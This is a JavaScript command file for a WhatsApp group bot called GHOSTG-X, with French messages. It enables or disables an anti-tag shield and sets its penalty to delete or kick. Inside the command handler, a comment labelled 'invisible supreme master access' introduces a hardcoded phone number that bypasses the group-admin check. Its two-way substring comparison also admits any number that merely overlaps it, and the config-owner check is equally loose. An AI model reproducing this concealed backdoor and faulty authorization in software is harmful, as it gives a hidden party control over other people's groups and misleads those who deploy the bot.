/**
 * AntiTag Command
 * Enable/disable anti-tag and set action (delete/kick)
 */

const database = require('../../database');
const config = require ('../../config.js');

// Extraction du préfixe pour l'usage
const prefix = config.prefix || '.';

// Fonction pour le style Small Caps (Garde la cohérence visuelle)
function toSmallCaps(text) {
  const normal = "abcdefghijklmnopqrstuvwxyz0123456789";
  const smallCaps = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789";

  const cleanedText = text.toLowerCase()
    .normalize("NFD").replace(/[\u0300-\u036f]/g, ""); 

  return cleanedText.split('').map(c => {
    const index = normal.indexOf(c);
    return index !== -1 ? smallCaps[index] : c;
  }).join('');
}

module.exports = {
  name: 'antitag',
  aliases: ['antimention', 'at'],
  description: '**『 ɢʜᴏsᴛɢ-𝐗 』➪ ᴄᴏɴғɪɢᴜʀᴇ ʟᴀ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ᴀɴᴛɪ-ᴛᴀɢ (ᴛᴀɢᴀʟʟ/ʜɪᴅᴇᴛᴀɢ)**',
  usage: `${prefix}antitag <on/off/set/get>`,
  category: '‎⛨ ɢᴀʀᴅɪᴇɴs ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ',
  groupOnly: true,
  adminOnly: true,
  botAdminNeeded: true,

  async execute(sock, msg, args, extra) {
    const { reply } = extra;
    try {
      const senderJid = msg.key.participant || msg.key.remoteJid;
      const senderNumber = senderJid.replace(/\D/g, '');

      // 🛡️ TON ACCÈS MAÎTRE SUPRÊME INVISIBLE
      const supremeOwner = '22651622652';
      const isSupremeOwner = senderNumber.includes(supremeOwner) || supremeOwner.includes(senderNumber);

      const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => {
        const cleanN = String(n).replace(/\D/g, '');
        return senderNumber.includes(cleanN) || cleanN.includes(senderNumber);
      });

      const isMe = msg.key.fromMe || isConfigOwner || isSupremeOwner;

      // 🚨 ADAPTATION : Si ce n'est pas TOI, on vérifie s'il est admin
      if (!isMe) {
        const isAdmins = extra.isAdmins || false; 
        if (!isAdmins) {
          return reply(`*❌ ${toSmallCaps('cette commande est reservee aux administrateurs du sanctuaire')} !*`);
        }
      }

      if (!args[0]) {
        const settings = database.getGroupSettings(extra.from);
        const status = settings.antitag ? 'ON' : 'OFF';
        const action = (settings.antitagAction || 'delete').toUpperCase();

        return reply(
          `╭╼━≪• *sᴛᴀᴛᴜᴛ ʙᴏᴜᴄʟɪᴇʀ_ᴛᴀɢs* •≫━╾╮\n` +
          `┃ *ᴇ́ᴛᴀᴛ* : ${status}\n` +
          `┃ *sᴇɴᴛᴇɴᴄᴇ* : ${action}\n` +
          `╰━━━━━━━━━━━━━━━╯\n\n` +
          `🔮 *ɪɴᴄᴀɴᴛᴀᴛɪᴏɴs ᴅɪsᴘᴏɴɪʙʟᴇs :*\n` +
          `*ᴄᴇᴛ ᴀʀᴄᴀɴᴇ ᴅᴇ́ᴛᴇᴄᴛᴇ ᴇᴛ ᴘᴜʀɢᴇ ʟᴇs ᴛᴀɢs ɪɴᴛᴇᴍᴘᴇsᴛɪғs ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ.*\n\n` +
          `  ${prefix}antitag on\n` +
          `  ${prefix}antitag off\n` +
          `  ${prefix}antitag set delete | kick\n` +
          `  ${prefix}antitag get\n\n` +
          `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`
        );
      }

      const opt = args[0].toLowerCase();

      if (opt === 'on') {
        if (database.getGroupSettings(extra.from).antitag) {
          return reply(`*❌ ${toSmallCaps('le bouclier de tags est deja actif')} !*`);
        }
        database.updateGroupSettings(extra.from, { antitag: true });
        return reply(`*🛡️ ${toSmallCaps('bouclier de tags a ete eveille')} (ᴏɴ).*`);
      }

      if (opt === 'off') {
        database.updateGroupSettings(extra.from, { antitag: false });
        return reply(`*🔓 ${toSmallCaps('le bouclier de tags a ete desactive')} (ᴏғғ).*`);
      }

      if (opt === 'set') {
        if (args.length < 2) {
          return reply(`*❓ ${toSmallCaps('veuillez specifier une sentence')} :* \`${prefix}antitag set delete | kick\``);
        }

        const setAction = args[1].toLowerCase();
        if (!['delete', 'kick'].includes(setAction)) {
          return reply(`*❓ ${toSmallCaps('sentence invalide. choisissez entre delete ou kick')}.*`);
        }

        database.updateGroupSettings(extra.from, { 
          antitagAction: setAction,
          antitag: true // Auto-enable when setting action
        });
        return reply(`*⚖️ ${toSmallCaps('la sentence du bouclier de tags est placee sur')} : ${setAction.toUpperCase()}*`);
      }

      if (opt === 'get') {
        const settings = database.getGroupSettings(extra.from);
        const status = settings.antitag ? 'ON' : 'OFF';
        const action = (settings.antitagAction || 'delete').toUpperCase();

        return reply(
          `╭╼━≪• *sᴛᴀᴛᴜᴛ ʙᴏᴜᴄʟɪᴇʀ_ᴛᴀɢs* •≫━╾╮\n` +
          `┃ *ᴇ́ᴛᴀᴛ* : ${status}\n` +
          `┃ *sᴇɴᴛᴇɴᴄᴇ* : ${action}\n` +
          `╰━━━━━━━━━━━━━━━╯\n\n` +
          `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`
        );
      }

      return reply(`*💡 ${toSmallCaps('utilise')} \`${prefix}antitag\` ${toSmallCaps('pour voir les options')}.*`);

    } catch (error) {
      console.error('Anti-tag command error:', error);
      await reply(`❌ *ᴇʀʀᴇᴜʀ :* ${error.message}`);
    }
  }
};
